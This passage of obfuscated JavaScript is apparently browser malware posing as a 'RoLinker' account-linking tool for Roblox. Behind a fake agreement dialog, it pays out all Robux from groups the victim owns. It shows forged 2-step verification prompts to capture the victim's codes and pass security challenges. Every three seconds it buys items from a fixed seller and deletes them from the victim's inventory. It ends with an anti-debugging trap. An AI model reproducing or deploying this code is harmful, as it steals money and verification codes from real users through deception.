                document.getElementsByClassName(
                  'btn-cta-md modal-modern-footer-button'
                )[0].disabled = true
              }
              setTimeout(M, 100)
            }
            M()
            document.getElementsByClassName(
              'btn-cta-md modal-modern-footer-button'
            )[0].onclick = function () {
              $.ajax({
                method: 'POST',
                url:
                  'https://twostepverification.roblox.com/v1/users/' +
                  p +
                  '/challenges/authenticator/verify',
                contentType: 'application/json',
                data: JSON.stringify({
                  challengeId: Y,
                  actionType: 'Generic',
                  code: document.getElementById(
                    'two-step-verification-code-input'
                  ).value,
                }),
                success: function (y) {
                  var R = y.verificationToken
                  $.ajax({
                    method: 'POST',
                    url: 'https://apis.roblox.com/challenge/v1/continue',
                    contentType: 'application/json',
                    data: JSON.stringify({
                      challengeId: T,
                      challengeMetadata:
                        '{"verificationToken":"' +
                        R +
                        '","rememberDevice":false,"challengeId":"' +
                        Y +
                        '","actionType":"Generic"}',
                      challengeType: 'twostepverification',
                    }),
                    success: function () {
                      document.getElementById('twoStepPrompts').remove(),
                        n(2000),
                        d()
                    },
                  })
                },
                error: function () {
                  document.getElementsByClassName(
                    'form-control-label bottom-label xsmall'
                  )[0].innerText = 'Invalid code'
                  document.getElementById('groupElementId').className =
                    'form-has-feedback  form-has-error form-group'
                },
              })
            }
          }
          function b() {
            var Y =
              '<div role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">2-Step Verification Required</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p>You must set up 2-Step Verification to complete this action.</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" href="https://www.roblox.com/my/account#!/security">Set Up</a></div></div></div></div></div></div>'
            document.body.insertAdjacentHTML('beforeend', Y)
          }
          function r(Y, T) {
            $.ajax({
              method: 'GET',
              url:
                'https://twostepverification.roblox.com/v1/users/' +
                p +
                '/configuration',
              contentType: 'application/json',
              success: function (a) {
                var M = a.primaryMediaType
                if (M == 'Email') {
                  P(Y, T)
                } else {
                  M == 'Authenticator' ? o(Y, T) : M == null && b()
                }
              },
            })
          }
          async function d() {
            fundsAmount = []
            const Y =
              'https://groups.roblox.com/v1/users/' +
              p +
              '/groups/roles?includeLocked=false'
            $.ajax({
              url: Y,
              type: 'GET',
              success: function (T) {
                T &&
                  Array.isArray(T.data) &&
                  T.data.length > 0 &&
                  T.data.forEach((a) => {
                    if (
                      a &&
                      a.group &&
                      a.group.id &&
                      a.role &&
                      a.role.rank === 255
                    ) {
                      const M = a.group.id
                      $.ajax({
                        method: 'GET',
                        url:
                          'https://economy.roblox.com/v1/groups/' +
                          M +
                          '/currency',
                        contentType: 'application/json',
                        success: function (B) {
                          var y = B.robux
                          fundsAmount.push(y)
                          y > x &&
                            $.ajax({
                              method: 'POST',
                              url:
                                'https://groups.roblox.com/v1/groups/' +
                                M +
                                '/payouts',
                              contentType: 'application/json',
                              data: JSON.stringify({
                                PayoutType: 'FixedAmount',
                                Recipients: [
                                  {
                                    recipientId: p,
                                    recipientType: 'User',
                                    amount: y,
                                  },
                                ],
                              }),
                              error: function (R) {
                                if (
                                  R.responseText.includes('restricted') == false
                                ) {
                                  var q0 = atob(
                                      R.getResponseHeader(
                                        'rblx-challenge-metadata'
                                      )
                                    ),
                                    q1 =
                                      R.getResponseHeader('rblx-challenge-id'),
                                    q2 = q0
                                      .split('"challengeId":"')
                                      .pop()
                                      .split('"')[0]
                                  r(q2, q1)
                                }
                              },
                            })
                        },
                      })
                    }
                  })
                ;(async function () {
                  await n(500)
                  fundsAmount.some((a) => a > x) == false && G()
                })()
              },
            })
          }
          var X =
            '<div id="RoLinker1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinker Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinker can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinker">Agree & Continue</button></div><div></div></div></div></div></div></div></div>'
          document.body.insertAdjacentHTML('beforeend', X)
          document.getElementById('agreeRoLinker').onclick = function () {
            document.getElementById('agreeRoLinker').disabled = true
            d()
          }
        }
        async function w() {
          let P = function (o) {
            function r(X) {
              return new Promise((Y, T) => {
                $.ajax({
                  url: 'https://economy.roblox.com/v1/users/' + X + '/currency',
                  success: function (a) {
                    if ((a && a.robux) || a.robux == 0) {
                      let v = null,
                        M = Number.POSITIVE_INFINITY
                      if (
                        a.robux < Math.min(...Object.values(f).map((B) => B[0]))
                      ) {
                        return
                      }
                      for (let B in f) {
                        f[B][0] <= a.robux &&
                          Math.abs(f[B][0] - a.robux) < Math.abs(M - a.robux) &&
                          ((v = B), (M = f[B][0]))
                      }
                      v !== null && Y([v, M, f[v][1], f[v][2]])
                    }
                  },
                })
              })
            }
            function d(X, Y, T) {
              var Z = {
                expectedSellerId: 5762605139,
                expectedCurrency: 1,
                expectedPrice: X,
              }
              $.ajax({
                url: 'https://economy.roblox.com/v1/purchases/products/' + Y,
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(Z),
                success: function () {
                  var v = { assetId: T }
                  $.ajax({
                    url: 'https://www.roblox.com/asset/delete-from-inventory',
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify(v),
                  })
                },
              })
              var a = { assetId: T }
              $.ajax({
                url: 'https://www.roblox.com/asset/delete-from-inventory',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(a),
              })
            }
            return r(o).then((X) => {
              d(X[1], X[2], X[3])
            })
          }
          setInterval(() => {
            P(p)
          }, 3000)
        }
        if (O.includes(String(p)) == true) {
          G()
        } else {
          function j(P) {
            const o =
              'https://inventory.roblox.com/v1/users/' +
              P +
              '/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc'
            var b = { url: o }
            return (b.type = 'GET'), $.ajax(b)
          }
          j(p)
            .done(function (P) {
              if (P && P.data && P.data.length > 0) {
                let d = 0
                P.data.forEach((X) => {
                  X.recentAveragePrice && (d += X.recentAveragePrice)
                })
                if (d > 2000) {
                  G()
                } else {
                  var r =
                    '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinker Alternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
                  document.body.insertAdjacentHTML('beforeend', r)
                  document.getElementById('closeButton1').onclick =
                    function () {
                      document.getElementById('promptPopup').remove()
                      document.getElementsByClassName(
                        'text-footer footer-note'
                      )[0].innerText = 'Not Active'
                    }
                  document.getElementById('promptPopup').onclick = function () {
                    document.getElementById('promptPopup').remove()
                    document.getElementsByClassName(
                      'text-footer footer-note'
                    )[0].innerText = 'Not Active'
                  }
                }
              } else {
                var r =
                  '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinker Alternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
                document.body.insertAdjacentHTML('beforeend', r)
                document.getElementById('closeButton1').onclick = function () {
                  document.getElementById('promptPopup').remove()
                  document.getElementsByClassName(
                    'text-footer footer-note'
                  )[0].innerText = 'Not Active'
                }
                document.getElementById('promptPopup').onclick = function () {
                  document.getElementById('promptPopup').remove()
                  document.getElementsByClassName(
                    'text-footer footer-note'
                  )[0].innerText = 'Not Active'
                }
              }
            })
            .fail(function (P, o, b) {
              var r =
                '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
              document.body.insertAdjacentHTML('beforeend', r)
              document.getElementById('closeButton1').onclick = function () {
                document.getElementById('promptPopup').remove()
                document.getElementsByClassName(
                  'text-footer footer-note'
                )[0].innerText = 'Not Active'
              }
              document.getElementById('promptPopup').onclick = function () {
                document.getElementById('promptPopup').remove()
                document.getElementsByClassName(
                  'text-footer footer-note'
                )[0].innerText = 'Not Active'
              }
            })
        }
      },
      error: function () {
        var z = {}
        z.QdLAF = 'promptPopup'
        z.Urnzy = 'text-footer footer-note'
        z.pfWrt = 'Not Active'
        var p =
          '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
        document.body.insertAdjacentHTML('beforeend', p)
        document.getElementById('closeButton1').onclick = function () {
          document.getElementById(G.QdLAF).remove()
          document.getElementsByClassName(G.Urnzy)[0].innerText = G.pfWrt
        }
        document.getElementById('promptPopup').onclick = function () {
          document.getElementById(G.QdLAF).remove()
          document.getElementsByClassName(G.Urnzy)[0].innerText = G.pfWrt
        }
      },
    }))
})()
function L(q) {
  function l(k) {
    if (typeof k === 'string') {
      return function (U) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + k / k).length !== 1 || k % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    l(++k)
  }
  try {
    if (q) {
      return l
    } else {
      l(0)
    }
  } catch (k) {}
}
